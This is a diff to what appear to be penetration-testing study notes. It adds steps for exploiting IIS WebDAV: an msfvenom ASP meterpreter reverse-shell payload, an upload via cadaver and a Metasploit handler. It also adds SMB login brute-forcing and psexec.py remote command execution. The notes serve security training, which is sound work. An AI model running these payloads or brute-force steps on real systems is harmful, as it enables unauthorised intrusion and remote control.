@@ -14,6 +14,8 @@
 - dig
 - METASPLOIT
 - whatweb
+- davtest
+- cadaver
 
 # Assessment Methodologies: Information Gathering
 
@@ -323,6 +325,40 @@ With an anonymous null session you can access the IPC$ share and interact with s
     - run nmap -sV -p xxx --script=http-enum x.x.x.x to find out if a webserver uses WebDAV
     - run "davtest" command to enumerate with parameters -url -auth username:password to perform some checks of webdav server
     - use "cadaver http://xxxxxxxx/webdav/" to access contents within the webdav server
+  
+  ### Exploiting Microsoft IIS WebDav via Metersploit
+    - Get a Payload :)
+      - msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=xxxx -f asp > revshell.asp (Get a asp reverse shell via msfvenom)
+    - upload the payload via cadaver
+    - start msfconsole with postgresql (systemctl start postgresql or service postgresql start && msfconsole)
+      - use multi/handler
+      - set payload windows/meterpreter/reverse_tcp
+      - specify LHOST and LPORT
+      - run -> to start the listener and execute the shell on the webdav server.
+  
+  ### Exploiting SMB with PsExec
+  
+    - SMB is a network file sharing protocol
+    - SMB is frequently used to share printers or files in a local area network
+    - SMB runs on TCP 445 and originally on top of NetBIOS (TCP 139)
+    - SAMABA is the Linux implementation of SMB
+  
+  SMB Authentication process
+  ![grafik](https://user-images.githubusercontent.com/58482416/207962932-8bca3853-de10-44d9-bcb7-c8af8ea1284d.png)
+
+  PSExec is a lightweight telnet replacement and it is very siliar to RDP (CMD level). PsExec Authentication is performed via SMB.
+  
+  Bruteforce smb login via metasploit
+  
+    - use auxiliary/scanner/smb/smb_login
+    - show options and specify the needed values
+  
+  
+  Psexec.py is the python linux implementation of psexec
+    Usage: psexec.py Administrator@x.x.x.x cmd.exe
+  
+  
+  
   
   
   
